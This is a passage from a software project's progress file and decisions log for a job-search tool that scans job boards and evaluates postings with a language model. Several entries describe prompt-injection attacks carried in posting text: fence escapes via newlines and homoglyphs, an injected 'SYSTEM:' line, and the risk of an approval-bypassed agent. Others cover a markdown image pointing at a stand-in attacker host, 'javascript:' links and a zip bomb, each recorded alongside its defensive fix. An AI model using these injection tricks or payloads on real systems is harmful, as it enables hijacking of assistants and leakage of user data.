# Implementation Progress

Phases are defined in `architecture.md` §33. Build one at a time. Do not skip ahead.

The remaining work queue is `docs/plan.md`, owned by the `building-roleeye`
skill (`.github/skills/building-roleeye/`). This file stays what it has always
been: what shipped, and why. The plan file holds what is left.

| Phase | Scope | Status |
|---|---|---|
| — | Repository skeleton | done |
| 0 | TypeScript project, CLI skeleton, config loader, SQLite + migrations, logging, tests, README | done |
| 1 | Source adapter interface, Greenhouse adapter, normalize, dedupe, snapshots, source runs, `scan` + `show` | done |
| — | Pre-Phase-2 security review and hardening | done |
| 2 | Lever, Ashby, career pages, discovery scope config, capture modes, `add`, `scope test` | done |
| 2.5 | Cross-model review; source/job separation (migration 003), closure lifecycle, bug fixes | done |
| 3a | Criteria engine, hard filters, authenticity screening, backup, scheduling, interactive init | done |
| 3c | Configuration portal (`roleeye ui`) | done |
| 3b | Requirement extraction, reasoning provider, evaluation, cache, spend accounting, `evaluate` + `recommend` | done |
| 3.5 | Notifier (terminal, desktop, webhook), daily digest, `digest` | done |
| 4 | Fact store, `.docx`/`.pdf` import as draft facts, **archetype** resumes, claim validation, resume diff, `.docx` output | done |
| 5 | Application tracking, state history, notes, recommendation overrides, application question bank, form inspection | done |
| 6 | SQL search, FTS5, funnel + segment analytics, `stats`, `search`, `ask` | done |
| 6.5 | Review portal: queue, application timeline, analytics | done |
| 6.6 | Run control: portal-driven runs with live progress, schedule management, prompt review, addressable views | done |
| 7 | Career memory / local RAG | speculative |
| 8 | Learning loop | speculative |
| 9 | Desktop application shell over the portal, CLI as sidecar | planned (shell decided by `docs/desktop-shell-decision.md`: tray helper, no native window) |
| 10a | Agent CLI as a reasoner (Copilot CLI, all tools denied) | done |
| 10b | Tool-using agent / application assistant | gated on the controls in `docs/vision.md` §6.3 |
| — | VPS sync and private job site | deferred, not planned |

## Decisions log

| Date | Decision | Rationale |
|---|---|---|
| 2026-08-12 | Repository skeleton follows the layout in `agent.md` and `architecture.md` §7 verbatim, plus `src/core`, `src/util`, `export/`, `scripts/`, `docs/`. | The extra directories are mechanical (shared types, helpers, generated export target, notes) and do not change any architectural boundary. |
| 2026-08-12 | `better-sqlite3` for persistence. | Synchronous API keeps the ingestion pipeline simple and transactional; `node:sqlite` is still experimental on Node 22. |
| 2026-08-12 | Hand-written CLI router instead of a framework. | architecture.md §4 allows "a small explicit command router"; avoids a dependency for five commands. |
| 2026-08-12 | Migrations are TypeScript modules holding SQL strings. | Keeps `tsc` the only build step — no asset-copy stage — while the SQL stays reviewable in version control. |
| 2026-08-12 | Job IDs are derived from the identity key (`job_<sha256[0:16]>`) rather than random. | Re-ingesting the same posting into a fresh database yields the same ID, so artifact paths and exports stay stable. |
| 2026-08-12 | Evaluation/application/artifact/note tables ship in migration 001 even though phases 3-5 populate them. | The domain model in architecture.md §8 is fixed; creating the tables now avoids a schema churn migration later. |
| 2026-08-12 | Added `roleeye list` (not in the documented command set). | `show` needs a job ID and phase 6 owns real search; this is plain SQL filtering, not a substitute for it. |
| 2026-08-13 | Capture is scoped by user configuration rather than capturing every posting (§36). | A board holds 50-400 roles, nearly all irrelevant to one person. Scope is the largest lever on both noise and cost, and it belongs to the user, not to code. |
| 2026-08-13 | Added a job authenticity agent for ghost and fraudulent postings (§37). | Deterministic signals from our own longitudinal history — repost cadence, posting longevity — detect evergreen listings that no snapshot-free tool can see. |
| 2026-08-13 | Token budget is an architectural constraint with accounting and hard limits (§38). | Measured data showed the naive pipeline costs roughly $68 per full pass and repeats it every scan. Filtering and caching cut this about 100x. |
| 2026-08-13 | Local portal added as Phase 3.5, strictly as a client over existing modules. | YAML is a good storage format and a poor input format, but business logic must not migrate into a web layer. |
| 2026-08-13 | `.docx`/`.pdf` resume import produces draft facts requiring explicit approval. | Removes the blank-page problem without weakening the rule that every generated claim traces to an approved fact. |
| 2026-08-13 | Security review conducted before Phase 2 rather than after. | Phase 2 accepts arbitrary career-page URLs and Phase 3 puts posting text into prompts; both amplify weaknesses that are inert today. |
| 2026-08-13 | Lockfile `resolved` URLs normalized to `registry.npmjs.org`, with `.npmrc` pinning the public registry. | The lockfile had been generated behind a corporate mirror; publishing it would delegate dependency hosting for every contributor and CI job. |
| 2026-08-13 | A per-source scope group replaces the global group entirely rather than merging field by field. | Partial merging makes configuration hard to predict: a user who sets source-specific titles expects exactly those titles. |
| 2026-08-13 | The career-page adapter reads only schema.org `JobPosting` data and refuses to guess from arbitrary markup. | Heuristic scraping produces silently wrong records, and a wrong record is worse than a missing one. The error names the linked ATS when it finds one. |
| 2026-08-13 | Playwright stays an optional, dynamically imported peer rather than a dependency. | It is a large install most users never need, and architecture.md ranks browser automation last among discovery methods. |
| 2026-08-13 | Salary parsing now requires explicit monetary evidence and plausibility bounds. | Real postings caused "$12.7B valuation" and "founded in 2015… 13 countries" to be stored as pay. Compensation feeds a Phase 3 hard filter, so a wrong number is worse than no number. |
| 2026-08-13 | **Reversed**: the domain model is *not* fixed, and pre-creating Phase 3-5 tables was a mistake. | `jobs` conflated a logical role with one source posting, and `evaluations` had no link to the content it judged. Both had to be corrected before evaluation is built on them. |
| 2026-08-13 | Migration 003 separates `jobs` (logical role) from `source_postings` (one row per advertising source). | The same role on two ATS providers merged by fingerprint, then alternated `source_job_id` every scan and reported a repost forever. Repost cadence is the primary ghost-job signal, so that noise had to go before Phase 3 depends on it. |
| 2026-08-13 | Clustering uses a location-independent key requiring an identical body under the same company. | Recognises one role advertised on several providers or in several locations, while never merging on title similarity. An absent body never clusters. |
| 2026-08-13 | Evaluations reference a snapshot, a content hash, and profile/criteria hashes. | Without them a verdict cannot be attributed to the body that produced it, cannot be marked stale after an edit, and the documented cache key cannot be implemented. |
| 2026-08-13 | Postings close only after a source run succeeds, and a role closes only when every posting closes. | `closed_at` was previously never set at all. A failed fetch must never retire live roles (architecture.md §30). |
| 2026-08-13 | The per-scan cap defers unseen roles instead of truncating the fetch. | Truncating stopped refreshing known roles — which would eventually close live jobs — and could hide the same role forever if it sat past the cap in the provider's ordering. |
| 2026-08-13 | Boilerplate is removed by truncating at terminal headings, not by matching sections. | Measured on 29 live postings: 36% fewer characters, ~490 tokens saved each. A per-section matcher saved 19 tokens of 1,077, because real postings (Ramp) end with a benefits heading followed by *unlabeled* country bullet lists that no heading pattern matches. |
| 2026-08-13 | Nested configuration objects are `.strict()`. | A mistyped key such as `min_base_salary` was silently dropped, leaving the user believing a hard filter was active when it was not. Found by writing a test that used the wrong field name. |
| 2026-08-13 | The portal reports an unreadable config file instead of quietly showing defaults. | It falls back to defaults so the page still opens; without a warning, pressing save would replace the user's real settings with those defaults. Malformed YAML also returned an opaque 500. |
| 2026-08-13 | The page's embedded script is executed in tests against a DOM shim, not merely parsed. | The script is a string inside a `.ts` file, so the compiler never sees it. The first run of this harness immediately caught a `ReferenceError` that typechecking and `node --check` both passed. |
| 2026-08-13 | Resumes are tailored per role archetype (3-6), not per posting. | 100 postings produced 100 documents the user would never read, under their own name, at 100x the cost. Regeneration is triggered by an archetype changing, not by a posting arriving. |
| 2026-08-13 | Application answers are classified recalled / composed / never-invented. | "Generate answers automatically" collides with the existing prohibition on inventing legal, demographic and compensation answers. Recall is retrieval of the user's own stated answer; it is not generation. |
| 2026-08-13 | Agent mode (delegating to an installed `--yolo` agent) is sequenced last and gated. | It is the feature most likely to make the product usable by non-engineers and the one most likely to harm them: postings are attacker-controlled text, and an approval-bypassed agent running as the user turns prompt injection into code execution with that user's privileges. |
| 2026-08-13 | Posting-derived facts (company, title, location, team) moved *inside* the prompt fence, and field values are newline-stripped. | A cross-model review found they were interpolated outside it. Reproduced: a job title containing newlines escaped the facts block and appeared as a free-standing `SYSTEM:` instruction before the fence began. The poster controls the title. |
| 2026-08-13 | Model-extracted requirements are fenced too when passed to the assessment pass. | They are a model's reading of attacker text, so an injected instruction can be carried forward into a "structured" field. Structured is not trusted. |
| 2026-08-13 | Fence markers are neutralised case-insensitively. | Exact-string replacement let `untrusted_job_posting>>>` through untouched, and models match instructions case-insensitively. |
| 2026-08-13 | Boilerplate truncation requires heading *shape*, not a line prefix. | The prefix rule discarded everything after "Benefits of this microservice architecture include…", losing a work-authorisation requirement that feeds a hard filter. Heading shape keeps the full 36% saving while retaining decision input. |
| 2026-08-13 | The evaluation cache key includes provider name and pass count. | A two-pass verdict was being served to a user who had since asked for the adversarial third pass, and one model name means different things on different providers. |
| 2026-08-13 | Portal routes refuse to merge into a config file that does not load. | The portal shows defaults for an unreadable file; merging one panel's edit into those defaults and saving would silently replace every hand-written setting. A UI warning was not sufficient. |
| 2026-08-13 | **Corrected**: `docs/vision.md` claimed a posting-to-archetype classifier already exists in `src/portal/presets.ts`. It does not. | `presets.ts` compiles UI selections into scope configuration. The classifier is unbuilt work in Phase 4, and recording it as existing would have hidden real scope. |
| 2026-08-13 | **Reversed**: agent mode ships now as a reasoner, instead of last. | It was sequenced last because `--yolo` was assumed necessary. It is not: an approval bypass is only needed by an agent that *acts*. Invoked with `--deny-tool=all --disable-builtin-mcps --no-custom-instructions`, the agent has the blast radius of an API call. The dangerous version (tool use, browser automation) stays gated as Phase 10b. |
| 2026-08-13 | The user brings their own paid coding agent; Copilot CLI is supported first. | Removes the API key, which was the real barrier for anyone who is not already an engineer with a model subscription. Ollama and direct API keys remain supported but are no longer the onboarding story. |
| 2026-08-13 | `--no-custom-instructions` is part of the hardened flag set, not an optimisation. | An agent otherwise loads instruction files from the working directory and user profile, which would silently join a prompt that also contains an untrusted job posting. |
| 2026-08-13 | The agent CLI provider reports `requestCount` and leaves `estimatedCostUsd` undefined. | It bills against a subscription quota, not per token. Measured 30.2k input tokens for a 90-character prompt, because the agent carries a large fixed system prompt. Inventing a dollar figure would make spend accounting confidently wrong. |
| 2026-08-13 | The schema shape is now sent to every provider, not just named. | Found by running the real prompt against the real agent: it returned `company` / `responsibilities` / `required_qualifications` where the schema wanted `primary_mission` / `seniority` / `required_skills`. The OpenAI path had the same gap — `json_object` mode guarantees valid JSON, not correct fields — and 327 passing tests missed it because the scripted provider returns pre-shaped data. |
| 2026-08-13 | String length limits are included in the schema hint. | The second live run produced correct field names and over-long values. A limit the model is never told about is a limit it cannot respect. |
| 2026-08-13 | Tauri will load the existing portal over `127.0.0.1` with the CLI as a sidecar. | A conventional Tauri app would add a Rust toolchain and a frontend bundler, breaking the rule that `tsc` is the only build step. Loading a URL keeps one UI implementation and no bundler. |
| 2026-08-13 | Evaluation is capped at 5 roles per run by default, with no maximum and a warning past 20. | Measured 7 minutes per role through an agent CLI, so an uncapped pass over the eligible set is a multi-hour job. A small run that finishes is worth more than a large one the user cancels. The warning states the estimated hours rather than refusing. |
| 2026-08-13 | The cap keeps the highest-priority roles, ranked deterministically. | A cap that keeps whatever the database returned first is a cap that throws away the best role. Priority reuses the screening verdict already computed — freshness, hiring intent, fraud risk, provenance, stated pay, body length, age — so it is free and cannot be swayed by a posting's persuasive writing. It ranks likelihood of repaying a call, never fit. |
| 2026-08-14 | **Corrected**: architecture.md §33 Phase 4 claimed archetypes map from "the existing role-family classifier". No such classifier exists. | `ROLE_FAMILIES` in `src/portal/presets.ts` compiles UI selections into *scope configuration* — what to capture — and never classifies a posting. The identical claim was corrected in `docs/vision.md` on 2026-08-13; the plan still carried it, which understated Phase 4 by a whole component. |
| 2026-08-14 | Archetype classification is deterministic, scored from the title and the requirements Phase 3b already extracted. | Classification runs over every eligible posting, so a model call per posting would reintroduce exactly the per-posting cost that archetypes exist to avoid. A weak or tied score leaves the posting `unassigned` rather than guessing, and an unassigned pile is the signal that an archetype is missing. |
| 2026-08-14 | Facts live in SQLite; `profile/accomplishments.yaml` becomes an import and export format. | Approval is lifecycle state — draft or approved, by whom, from which document, cited by which bullets. A hand-editable file cannot hold it: editing the statement of an approved fact in a text editor silently re-approves text nobody reviewed. Export keeps the readable copy, so nothing is locked in. |
| 2026-08-14 | The `artifacts` table is rebuilt in migration 005, not reused. | It ships from migration 001 naming only a job, so a generated resume cannot be attributed to the facts, archetype, or profile that produced it, and cannot be marked stale when they change. This is the same defect that forced `evaluations` to be corrected in 003 — and the same root cause: tables created for a phase that had not been designed yet. |
| 2026-08-14 | `mammoth` and `docx` are dependencies; `pdfjs-dist` is an optional peer, dynamically imported. | Measured installed size: 2.1 MB, 4.4 MB, and 32.9 MB. The PDF reader is eight times the rest of the feature combined and is needed only if the user's resume is a PDF, which follows the Playwright precedent. `.docx` is the primary path and must not require a second install. All three were tested against real files — a generated `.docx` round-tripped through `mammoth`, and a hand-built PDF read back through `pdfjs-dist` — before being chosen. |
| 2026-08-14 | Imported resumes are treated as untrusted input under §40. | A resume is a file of unknown provenance: templates are downloaded and PDF is a program format. Size is bounded before parsing, extracted text is capped, the PDF reader runs with `isEvalSupported: false` and no worker or network, and extracted text is fenced when it reaches a prompt. |
| 2026-08-14 | Removed the empty `src/notifications/` and `src/sync/` placeholders. | `src/notify/` has held the real notifier since Phase 3.5, and VPS sync is recorded as deferred and not planned. Directories reserved for work that will not happen read as unfinished work. |
| 2026-08-14 | Archetypes are configuration with a content hash, not a database table, reversing what the Phase 4 plan said that morning. | They are declarative, the user owns them, and the portal will edit them — the same shape as `criteria.yaml`, whose content hash already solves staleness. Only the *assignment* of a posting to an archetype is state. |
| 2026-08-14 | Validation counts the employer, title and dates of a cited fact's own experience as evidence. | The first live generation wrote "Staff software engineer at Acme Corp since 2019" and had it rejected as invention. The store holds that data — it is the section heading of the resume — but no fact statement repeats it, so the summary was unwriteable. Evidence is still per cited fact, so a claim cannot borrow one employer's name while citing another's work. |
| 2026-08-14 | A resume bullet is the only thing extraction turns into a fact. | Resume prose is summary and self-description. Importing it produces a store full of "Results-driven engineer with a passion for scale" — sentences the user would never put on a tailored resume and now has to reject one at a time. |
| 2026-08-14 | `npm run typecheck` never checked a single test file. | `tsconfig.tests.json` listed `tests/**/*.ts` in `include`, but inherited `exclude: ["tests"]` from the base config, which wins. Sixteen type errors were sitting in the suite, invisible because `tsx` strips types without checking them. |
| 2026-08-14 | The prompt fence marker now carries a random suffix per prompt. | Two independent model reviews attacked Phase 4. One found that neutralising the literal marker is not enough: a soft hyphen, a word joiner, a combining mark or a Cyrillic homoglyph inside the word all survive ingest and read to a model as the marker. Enumerating those characters is a losing game; a suffix the poster cannot predict ends the class. |
| 2026-08-16 | The portal can start, watch, stop and schedule a run. | It could configure a pipeline it could not run: the only way to use RoleEye was to leave the browser and type three commands in the right order, and the page referred to "the scheduled run" without being able to say whether one existed. A configurator for a thing you cannot operate is half a product, and it is the half that does not work. |
| 2026-08-16 | Chaining the stages is a shared module (`src/core/pipeline.ts`), not portal code, and ships as `roleeye run`. | `scan`, `screen` and `evaluate` are each useful alone, but running them in order is new behaviour. Putting the order in the web layer would have made the portal the only thing that knew it, which is exactly the drift the portal was built to avoid. One function now backs the run button, the CLI command, and what the scheduler installs. |
| 2026-08-16 | Run progress is polled from memory rather than pushed over SSE, and is never persisted. | `EventSource` cannot set a header, so it could not carry the portal token. Progress is also the state of a process and meaningless once that process is gone: persisting it would let a page show "scanning" for a run that died with its terminal. What a run *produced* is already durable — scans, source runs, screenings and evaluations are written by the stages themselves. |
| 2026-08-16 | A scan where some sources failed is reported as a warning, not as `ok`. | Found by running it: one board of two failed and the pipeline returned `status: "ok"` with an empty `errors` array. Partial failure needed its own list, because folding it into `errors` made a single-stage run report total failure. A source that fails quietly is a source that stays broken for weeks. |
| 2026-08-16 | The prompts are shown read-only; only the guidance inside them is editable. | Users were spending money on a question they had never seen. But the fence separating instructions from attacker-written posting text is a security control carrying a random per-prompt marker, and a user cannot be asked to maintain it correctly. What they own is what the prompt says about *them* — direction, weights, thresholds — so `PUT /api/prompt` writes those three keys and nothing else. |
| 2026-08-16 | Views are addressed by hash (`#/review`), not by path. | Five sections behind one URL meant no deep link, no back button, and a reload that always landed on setup. A pushed path would drop the token the portal is served with, so the hash is replaced rather than pushed. |
| 2026-08-16 | A second run is refused with 409 rather than queued, and stopping is a request honoured at the next safe boundary. | Two concurrent runs would interleave source runs through one SQLite connection and spend the daily budget twice. Killing one mid-flight would leave a source run open forever and discard a model call already paid for. |
| 2026-08-16 | Companies are chosen by size, ownership and sector, not by name. | Picking individual companies assumes the user already knows which boards exist, and does not scale past a handful. Discovery still needs a concrete board token, so facets select over the curated catalog rather than replacing it — the names stay visible as the *result* of a choice instead of being the choice. |
| 2026-08-16 | The catalog stores a headcount band and public/private, deliberately **not** funding stage. | "Series B" is what people ask for and the worst thing to store: rounds are announced constantly, so the label would be wrong within months and wrong silently — the same failure the file already warns about for board tokens. Headcount band and listing status move slowly enough that a three-way bucket stays true, and they answer what the stage question is usually really about: how much structure and process. |
| 2026-08-16 | Score weights are authored as a 0-5 importance per category and compiled to weights totalling 100. | Distributing 100 points across seven categories is a puzzle, not a preference: "location: 100%" means nothing, nobody sets compensation to zero, and the constraint mostly produced arithmetic and unsaveable states. `importance` is the authored form, `weights` stays the only thing scoring reads, and they are written together — largest-remainder, so no combination of ratings can fail validation. |
| 2026-08-16 | A dead server is announced at the top of the page, once, not inside whichever panel asked last. | Reported as "clicking Remove throws an error". The portal had stopped, so every panel was dead — but only the schedule panel said so, which reads as that one button being broken. |
| 2026-08-16 | Scheduling refuses when there is no build, and warns when the build is stale. | Found by reading back what was installed: the task runs `node dist/index.js run`, and `dist` predated the `run` command, so the daily run would have failed at 07:30 every morning with nobody watching. Missing is a refusal; stale is a warning, because an old build still runs. |
| 2026-08-16 | Companies are stored as a rule resolved at load, and individual names are hidden by default. | A materialised list was a snapshot of the catalog on the day it was saved: a company added later matched everything the user had asked for and was never watched. `resolveSources()` now merges named boards with rule-derived ones inside `loadConfig`, so `scan`, `doctor` and the portal all see one list and nothing downstream changed. Showing the names by default also invited "so where is Google?", which listing harder cannot answer. |
| 2026-08-16 | The catalog says out loud what it cannot reach. | Large employers run their own applicant tracking systems and publish no machine-readable board, so no tool can watch them this way. Coverage is now stated as a share — "N of 51 boards RoleEye can read" — because a bare count reads as a claim about every company there is. |
| 2026-08-16 | The setup page stopped writing fields it does not ask about. | Found by a cross-model review. `compileSelection` emitted `direction: { positive: [], negative: [] }` on every save; that was inert while nothing could set direction, and became silent data loss the moment the Run view let people write it. `require_us_payroll`, `on_unknown`, `titles.patterns`, `levels.include` and `locations.exclude` were the same shape of constant. Scope and preferences are now merged one level down instead of replaced. |
| 2026-08-16 | Only a board identical to the catalog's own output is adopted into the rule. | Adopting any catalog board would have dropped a *disabled* one from `sources` and let the rule recreate it enabled, and would have discarded user-chosen names — which is what `--only` selects and what run history is filed under. |
| 2026-08-14 | Claim validation gained unicode digit folding, a lower-case technology check, a scope-and-seniority check, and an outright ban on links and markup. | The reviews walked through the validator with `kubernetes` in lower case, `６０%` in full-width digits, "Doubled revenue", "Managed a large team", and `![p](http://attacker/x.png)`. Every one reached a document. The last is the worst: it makes opening your own resume a network request to whoever wrote the posting. |
| 2026-08-14 | Posting-derived text is escaped before it is written into Markdown artifacts. | Reproduced: a job title of `![pixel](http://attacker/ping.png)` put three attacker URLs into `resume-delta.md`. The rule says a posting must never cause a network request; previewing the file was one. |
| 2026-08-14 | `.docx` import bounds the *declared uncompressed* size, read from the archive's central directory before anything is inflated. | The 10 MB file cap bounds compressed bytes and nothing else. Measured: a 249 KB file expanding to 145 MB of XML — 598x — and 544 MB of resident memory, because the text cap only applies after mammoth has decompressed everything. |
| 2026-08-14 | Approval is bound to a fact's provenance, not only its words. | An approved unattached statement could be re-imported under an attacker-supplied employer and keep its approval, making an unreviewed company name quotable evidence. Any change to the experience or tags now returns the fact to draft, and un-retiring does too. |
| 2026-08-14 | A delta refuses a stale resume and revalidates every claim before printing it. | It reused the `supported` flag stored at generation time, so a fact retired afterwards still reached the document. A stored verdict is not a current one. |
| 2026-08-14 | Documents are written before the generation row is committed. | Saving first superseded the previous generation, so a failed write left the database reporting a current resume that did not exist, and the next run saw nothing stale and refused to regenerate. |
| 2026-08-14 | `approvedSetHash` covers tags and employer, not just statements. | Tags decide which facts an archetype draws on. Re-tagging changed the input set while the resume was still reported current. |
| 2026-08-14 | Build, typecheck and tests run in CI on Ubuntu and Windows. | The suite is hermetic, so it needs no secrets and calls no model. Its most valuable step is `npm ci`: this lockfile was rewritten to point at the public registry from a machine that cannot reach it, and CI is the only place that can prove the rewrite honest. It did, on the first run. |
| 2026-08-14 | The shipped `criteria.example.yaml` documents every section the schema accepts, and a test enforces it. | The CLI told users to "set reasoning.provider in config/criteria.yaml" while the example that `init` copies had no reasoning block — nor screening, budget, or notify. It still validated, because all four have defaults, which is exactly why nothing caught it. Found while hand-editing that file during Phase 4 live testing. |
| 2026-08-14 | Fact identity is the statement *and* the employer (migration 006). | The same true sentence under two jobs — "Led a cross-functional platform migration." repeats for a reason — collapsed into one row, and the second job lost its provenance, so a resume cited one employer for work done at both. Adoption still reconciles an unattached fact with the employer a document later supplies, and refuses to guess when the words already sit under two. |
| 2026-08-14 | A forced reclassification supersedes the manual corrections it overrides, and any fresh write clears that flag. | The manual lookup searched every archetype version, so a correction outranked a deliberate `--force` and the next ordinary run put it back. Fixing that introduced a second bug in the same hour: the superseded flag outlived the row and silently swallowed the *next* correction. Caught by writing the test for the fix rather than by reasoning about it. |
| 2026-08-14 | Classification batches its reads and writes with one prepared statement. | 601 statements for 100 roles became 4; 1,000 roles now cost 8 statements and 42 ms. The work is a loop over data already held, and it should not cost a multiple of the corpus. |
| 2026-08-14 | Application tracking ships as `roleeye apply <record\|status\|note\|skip\|list\|show\|answers\|answer>` rather than the planned `apply-record`, `status` and `note`. | Seventeen top-level commands is already more than anyone reads — the user said so — and a bare `status` would have collided with `roleeye resume status` in everybody's memory. |
| 2026-08-14 | `applications` is rebuilt in migration 007, the third table created before its phase was designed. | It carried a free-text `notes` column duplicating the `notes` table and no way to record which resume was actually sent. A reply six weeks later is only informative if the document that earned it can still be named. |
| 2026-08-14 | Passing on a recommended role is recorded as deliberately as applying to one. | Both directions are feedback, and the half that gets discarded everywhere else — "it recommended this and I ignored it" — is the half that says the scoring is wrong. Phase 8 can only learn from what phase 5 collects. |
| 2026-08-14 | Status history orders by insertion within the same instant. | Recording an application and correcting its status in the same millisecond is ordinary, and the tie-break was a random id, so the history displayed in random order. Found by a test that ran the transitions faster than the clock ticks. |
| 2026-08-14 | Form inspection reads Greenhouse and reports that it cannot read Lever or Ashby, rather than rendering their apply pages to guess. | Verified against all three live APIs: Greenhouse publishes the question set (`?questions=true`), the other two publish the posting and not the form. Guessing an employer's questions from rendered markup produces a confident wrong record, which the career-page adapter already refuses to do for postings. |
| 2026-08-14 | Voluntary self-identification questions are reported, never matched against the bank and never stored. | EEO questionnaires are asked per application by design — Instacart's own form says so — and they are the exact categories the product promises never to infer. Two live payload shapes carry them: `compliance[].questions` with `fields`, and `demographic_questions` with `answer_options`. |
| 2026-08-14 | `isSensitiveQuestion` now matches "authorized to work" and "eligible to work", not only "work authorization". | The commonest US phrasing reverses the word order, so "Are you legally authorized to work in the United States?" was reported as an ordinary question on a real Discord form and would have been answerable from the bank. Found by running the new command against a live posting, not by reading the regex. |
| 2026-08-14 | Sensitivity patterns are anchored on word boundaries, and identity for a protected question is its whole text. | A cross-model review ran the substring patterns: `age` matched "manage", `race` matched "embrace", `disab` matched "disable". It then showed that the lossy answer key could be collided deliberately, so an employer's ordinary question could be shown the user's answer to a protected one. The key still unifies phrasings; it is no longer trusted alone. |
| 2026-08-14 | A Greenhouse board and job id must come from the same URL. | Deriving them separately let a configured board be paired with a number taken from an attacker-influenced posting URL, returning another role's questions under this role's name. A configured board that disagrees with the URL is now reported, not reconciled. |
| 2026-08-14 | The search index is derived from the records, with a hash per document, and is never written to directly (migration 008). | An index that is also a place things are stored eventually disagrees with the database. Because it is derived, `--reindex` is always safe and an incremental sync costs six set-based statements regardless of corpus size. |
| 2026-08-14 | FTS5 is external-content, and every user term is quoted as a literal phrase. | External content avoids a second copy of every description. Literal quoting is what stops `senior "staff" engineer (remote)` from being read as query syntax: a search box that can raise a syntax error is one people stop using. |
| 2026-08-14 | Funnel stages past `applied` are read from the status events, not from the current status. | An application that reached a final round and was then rejected still had a final round. Reading the cached status would report a pipeline in which nobody was ever interviewed. |
| 2026-08-14 | A rate with no denominator is reported as unknown, not as zero. | "0% of applications got a screen" is a claim about a job search. "No applications yet" is a fact about a database. |
| 2026-08-14 | `ask` is deterministic, refuses semantic questions, and prints the command that reproduces every answer. | A question with an exact answer in a table should not be paraphrased by a model that may get the date wrong (§21). Resemblance questions need embeddings; answering them from keyword overlap would be confident and wrong. |
| 2026-08-14 | The planner matches companies against the companies that exist, and a constraint consumes its own words. | Guessing an employer from capitalisation reads "Staff Engineer" as one. And "When did I apply to Ramp?" filtered on the company *and* demanded the word appear in the body — FTS requires every term — so a question with a good structured answer returned nothing. Both found by running it. |
| 2026-08-14 | Every derived document detects change by content, not by identity. | A cross-model review pointed out that evaluations and notes were keyed on their id alone. Nothing edits them today, so nothing was stale — but an index whose correctness rests on nobody adding an edit path later is one that goes stale quietly. Jobs still compare their stored `description_hash`, because re-hashing 100 KB bodies to ask "did anything change?" makes the cheap question expensive. |
| 2026-08-14 | The funnel window is applied *inside* the latest-verdict subquery. | Taking the latest verdict overall and then filtering by date meant a role recommended in July and re-evaluated in September reported July as recommending nothing. A later opinion must not rewrite an earlier month. |
| 2026-08-14 | The correlated "latest verdict per role" join stays, because it was measured. | The review predicted it would degrade badly. `scripts/measure-search.ts` at 10,000 jobs: index build 512 ms, incremental sync 82 ms, keyword search 15 ms, that join 4 ms, funnel 3 ms. It is an index seek per row, not a scan. |
| 2026-08-14 | The portal's decision button reads "Record that I applied", not "Apply". | It records an application and opens the posting in a new tab; it has no way to submit a form. A button labelled "Apply" in a tool that cannot apply is the one place this product could most easily mislead somebody about what it just did for them. |
| 2026-08-14 | The review queue keeps a decided role visible with its decision, rather than removing it. | A queue that empties as you act on it cannot be checked afterwards. It is a record, not an inbox. |
| 2026-08-14 | A posting's title reaches the portal verbatim, including markup, and is placed with `textContent`. | Rewriting a title would misquote the employer. The safety property is not that markup is absent — it is that markup can only ever be displayed. A test asserts the review script contains no `innerHTML`, `outerHTML`, `insertAdjacentHTML` or `document.write`. |
| 2026-08-14 | Only canonicalised `https` links leave the portal, `/api/decide` takes no URL from the request, and the page refuses to open any other scheme. | A cross-model review found that `source_url` is stored raw when canonicalisation fails, so `javascript:` in a posting reached the queue as the link and was passed to `open()` when the user recorded that they had applied. Three layers, because a click-to-execute sink deserves more than one. |
| 2026-08-14 | The search index is refreshed when `roleeye ui` starts, never by a route. | `GET /api/history` was calling the default `search()`, which syncs — a write transaction over the whole corpus, from a GET, repeatable in a loop. |
| 2026-08-14 | `listRecommendations` breaks a timestamp tie by insertion order. | `MAX(created_at)` returns both rows when two evaluations of one role land in the same millisecond, so the review queue showed the role twice with contradictory advice. The same defect had already been fixed once, in status history. |
| 2026-08-15 | Portal requests report a reason instead of throwing, and every progress word must resolve into something. | Reported on the first real run: "Saving..." stayed on screen forever because `fetch` rejected when the portal had been stopped. The rule is now explicit — a page that says it is doing something must always say how it ended, including when the thing it is talking to has gone away. |
| 2026-08-15 | A 403 from the portal is explained as a stale token, not reported as a refusal. | Restarting `roleeye ui` mints a new token, so the commonest real failure is an old tab. "403" tells the user nothing they can act on; "open the link roleeye ui printed most recently" does. |
| 2026-08-15 | `npm run ui`, and the help output names the first three commands to run. | `npm run dev` passes no command through, so it printed twenty commands and no starting point — which is what the first user of this repo actually hit. |
| 2026-08-15 | A time window is `[since, until)` — inclusive start, exclusive end — in analytics and in search. | The automated PR review caught the mismatch: the planner builds a month as "the 1st to the 1st of the next month", and both query layers compared `<= until`. An application made at exactly midnight on 1 August was therefore counted in July *and* August, and two adjacent reports that each claim the same application cannot both be right. |
| 2026-08-15 | The portal only opens `https` links, matching what the server can emit rather than what it merely permits. | The same review pointed out that canonicalisation upgrades every link the server keeps, so accepting `http` at the sink only widened it if the server's behaviour ever changed — the opposite of what a second layer is for. |
| 2026-08-18 | **Reversed**: there is no native shell. Phase 9 ships a Windows tray helper that supervises the CLI and renders in the user's own browser, with the Node runtime bundled. Tauri is the fallback if a native window becomes necessary, not the plan. | All three candidates were prototyped against the real portal and measured on one machine (`docs/desktop-shell-decision.md`). A native shell costs about 1.6 seconds of extra wait at every launch — roughly 0.6 s against 2.1–2.2 s end to end, including the portal's own boot — because the user's browser has already paid the Chromium start-up and a webview has not. On memory the answer is conditional and a native shell never gets the cheap case: reusing an open browser costs 185.0 MB against Tauri's 437.8 MB, while starting one costs 862.8 MB, and Tauri pays its 437.8 MB either way — both browser figures measured on dedicated Edge profiles that were neither clean nor in the same state as each other. The three shells' installers differ by 3.32 MiB; bundling `node.exe` costs 20.9 MiB, so the framework was 13.7% of the question the 2026-08-13 entry thought it was answering. Cost to a contributor: 3.08 GB and a 149-second clean build for Rust, 823 MB and 18.6 s for Go, 13.6 KB and under a second for a compiler Windows already ships. |
| 2026-08-18 | The database, `config/`, `profile/` and `artifacts/` must live outside the install directory before anything ships an installer. | Measured while building the P9-0 installers, not reasoned about. A stand-in database at `app\data\roleeye.db` **survives a direct install over the top** — the install section only overwrites — but is **destroyed by an uninstall**, which does `RMDir /r "$INSTDIR"`. So the hazard is not "updating"; it is any updater that uninstalls first, or clears the directory to drop files the new version no longer ships, which is an ordinary design and the one that loses invariant 5 silently. Moving user data out of the install directory removes the hazard from every strategy instead of banning one. Also found: the scheduled task embeds two absolute paths (`"<node>" "<root>\dist\index.js" run`), so a versioned install directory silently breaks the 07:30 run on every update — the same failure mode already recorded on 2026-08-16. Both constraints are shell-independent and now belong to G-4 as inherited, not discovered. |

## Phase 6.5 notes

The portal stops being a setup wizard. Four views now: Setup, Review,
Applications, Reports.

### "Saving..." forever

